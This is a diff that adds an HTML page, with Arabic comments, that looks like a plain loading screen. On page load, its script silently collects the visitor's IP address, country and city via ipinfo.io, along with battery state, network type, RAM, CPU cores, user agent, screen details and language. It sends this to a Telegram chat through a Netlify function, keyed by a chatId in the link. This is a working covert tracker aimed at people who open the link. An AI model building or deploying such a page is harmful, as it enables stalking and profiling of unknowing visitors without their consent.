@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #1a2a3a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            width: 80%;
+            max-width: 300px;
+        }
+        .progress {
+            width: 100%;
+            height: 8px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: #3498db;
+            width: 0%;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+    </div>
+
+    <script>
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
+        function updateProgress(percent) {
+            document.getElementById('progressBar').style.width = percent + '%';
+        }
+        
+        async function sendToTelegram(message, chatId) {
+            try {
+                const response = await fetch('/.netlify/functions/device-info', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        message: message
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+        
+        function getHijriDate() {
+            return new Date().toLocaleDateString('ar-EG', {calendar: 'islamic'});
+        }
+        
+        function getCurrentTime() {
+            return new Date().toLocaleTimeString('ar-EG');
+        }
+        
+        function detectDeviceType() {
+            const ua = navigator.userAgent;
+            if (/mobile/i.test(ua)) return 'هاتف 📱';
+            if (/tablet/i.test(ua)) return 'تابلت 📱';
+            return 'كمبيوتر 🖥️';
+        }
+        
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            // ترتيب الكشف مهم لمنع الخطأ
+            if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome 🌐';
+            if (ua.includes('Firefox')) return 'Firefox 🌐';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari 🌐';
+            return 'متصفح آخر 🌐';
+        }
+        
+        function detectOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Android')) return 'Android 📱';
+            if (ua.includes('iOS') || ua.includes('iPhone')) return 'iOS 📱';
+            if (ua.includes('Windows')) return 'Windows 🖥️';
+            if (ua.includes('Mac')) return 'macOS 🖥️';
+            if (ua.includes('Linux')) return 'Linux 🖥️';
+            return 'غير معروف 🖥️';
+        }
+        
+        async function collectInfo() {
+            const chatId = getChatId();
+            if (!chatId) return;
+            
+            updateProgress(30);
+            
+            let location = {};
+            try {
+                // التغيير الوحيد: استبدال ipapi.co بـ ipinfo.io لأنها تعمل
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                // نضبط أسماء الحقول لتتطابق مع ما يستخدمه باقي الكود
+                location = {
+                    country_name: data.country || 'غير معروف',
+                    city: data.city || 'غير معروف',
+                    ip: data.ip || 'غير معروف',
+                    // ipinfo.io لا يعطي 'protocol'، لذلك نضعه undefined كما في مثالك
+                    protocol: undefined
+                };
+            } catch (error) {
+                location = {country_name: 'غير معروف', city: 'غير معروف', ip: 'غير معروف', protocol: undefined};
+            }
+            
+            updateProgress(60);
+            
+            let battery = {level: 'غير معروف', charging: false};
+            if ('getBattery' in navigator) {
+                try {
+                    const b = await navigator.getBattery();
+                    battery.level = Math.round(b.level * 100) + '%';
+                    battery.charging = b.charging;
+                } catch (e) {}
+            }
+            
+            updateProgress(90);
+            
+            // الحفاظ على نفس صيغة الرسالة تماماً كما طلبت
+            const message = `📱 معلومات الجهاز:
+- الدولة: ${location.country_name} 🔻
+- المدينة: ${location.city} 🏙️  
+- عنوان IP: ${location.ip} 🌍
+- شحن الهاتف: ${battery.level} 🔋
+- هل الهاتف يشحن؟: ${battery.charging ? 'نعم ⚡' : 'لا ⚡'}
+- الشبكة: ${navigator.connection?.effectiveType || 'غير معروف'} 📶
+- نوع الاتصال: ${navigator.connection?.type || 'غير معروف'} 📡
+- الوقت: ${getHijriDate()} ${getCurrentTime()} ⏰
+- اسم الجهاز: ${detectOS()} 🖥️
+- إصدار الجهاز: ${navigator.userAgent} 📜
+- نوع الجهاز: ${detectDeviceType()}
+- الذاكرة (RAM): ${navigator.deviceMemory || 'غير معروف'} GB 🧠
+- عدد الأنوية: ${navigator.hardwareConcurrency || 'غير معروف'} ⚙️
+- لغة النظام: ${navigator.language} 🌐
+- اسم المتصفح: ${detectBrowser()}
+- دقة الشاشة: ${screen.width}x${screen.height} 📏
+- إصدار نظام التشغيل: ${detectOS()}
+- وضع الشاشة: ${screen.orientation?.type || 'portrait-primary'} 🔄
+- عمق الألوان: ${screen.colorDepth} bit 🎨
+- بروتوكول الأمان: ${location.protocol} 🔒
+- تحديد الموقع: ${'geolocation' in navigator ? 'نعم 🌍' : 'لا 🌍'}
+- بلوتوث: ${'bluetooth' in navigator ? 'نعم 🔵' : 'لا 🔵'}
+- لمس: ${'ontouchstart' in window ? 'نعم ✋' : 'لا ✋'}`;
+
+            await sendToTelegram(message, chatId);
+            updateProgress(100);
+        }
+        
+        collectInfo();
+    </script>
+</body>
+</html>
